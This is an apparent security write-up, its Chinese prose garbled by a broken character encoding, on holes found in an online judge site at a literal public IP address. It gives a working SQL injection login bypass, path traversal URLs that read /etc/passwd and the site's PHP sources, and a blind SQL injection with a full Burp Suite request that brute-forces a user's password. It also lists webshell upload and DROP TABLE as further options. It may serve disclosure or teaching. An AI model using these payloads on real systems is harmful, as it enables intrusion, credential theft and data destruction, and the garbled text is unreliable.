# OJ�İ�ȫ����
��OJ���ڴ�����ȫ���⣬ؽ���Ľ���

## �����
�ύ�Զ��������.\rand_err.cpp����ʹ�����������֮���ύ���������ⶼ�����ڵȴ�״̬�������ȱ�����ڴ���Դʹ�ú�����ʱ������ƻ��ơ�

## SQLע�룬��һ�׶�
�ڵ�¼ҳ�� http://47.99.179.148/login.html���û�����д`USERNAME'and true or'`���������⣬���ɽ���`USERNAME`�û��ĺ�̨��
* ֱ���޸����루����Ҫ��֤ԭ���룩
* �޸�Remark��Phone��Email�ȸ�����Ϣ
* �鿴�ύ��¼��������AC����

## �����ļ���ȡ
��Ŀҳ����������ļ���ȡ©����`http://47.99.179.148/problem.php?id=?`����ע��㡣
����Զ�ȡ�����ļ���/root/�µ��ļ�ȱ��Ȩ�ޣ���
* http://47.99.179.148/problem.php?id=?../../../../../../etc/passwd 
* http://47.99.179.148/problem.php?id=?../../../../../../proc/mounts
* http://47.99.179.148/problem.php?id=?../../../../../../var/www/html/index.php
* http://47.99.179.148/problem.php?id=?../../../../../../var/www/html/register.php
* http://47.99.179.148/problem.php?id=?../../../../../../var/www/html/login.php

���PHPԴ�룬�ɵ����ݿ��˺š����룬�Լ�������

## SQLע�룬�ڶ��׶�
### ��������
#### ������볤��
`' or exists (select name from user_table where length(pwd)=6 and name='test') #`
�ܳɹ���¼�����ǵ�¼��Ӧ�������ݿ��е�һ���û�������˵��11������ĳ��ȡ�

#### Burp Suite �����ƽ�
```http
POST http://47.99.179.148/login.php HTTP/1.1
Host: 47.99.179.148
Content-Length: 32
Cache-Control: max-age=0
Origin: http://47.99.179.148
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://47.99.179.148/login.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=biaqfc1knovc6o0vav58qtkc0u
Connection: close

user_name=test' AND pwd LIKE '��1��%' #&password=xxx&login=Login
```
���У�`LIKE`ΪSQL��䣬����ƥ���ַ���ģʽ��`%`���������ַ���ͨ���������Burp Suite��Intruderģ�飬��Payloads��ǩ������Character SetΪ`0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`����ʼ�������۲���Ӧ�ĳ��ȣ����Ƚϳ����Ǹ���Ӧ��Ϊ��ǰλ���ַ���
��һλ��`1`��

![image-20210310222718374](security.assets/image-20210310222718374.png)�޸�POST����`user_name=test' AND pwd LIKE '1��1��%' #&password=xxx&login=Login`���ظ��������̡�
��λ�����ƽ⣬����������`123456`��

## ��������
Ϊ�˲�����������û�н�һ�����ԣ�������������˿��ܣ�
* �ϴ�Webshell���õ�ϵͳ����Ȩ
* ����ĩ��ȫ��ͬѧͬ���ھ���ʹ��`DROP TABLE`����ֱ��ɾ�����ݿ�
* �ϴ�������룬���������
* �������������ƽ��û���������ײ��
* ����

## �������
���ÿ�ԴOJ���������

## �ο�����
* [https://www.cnblogs.com/RyanSun17373259/p/12980424.html]
* [https://www.ms509.com/2020/06/24/Waf-Bypass-Sql/]
* [https://www.runoob.com/sql/sql-like.html]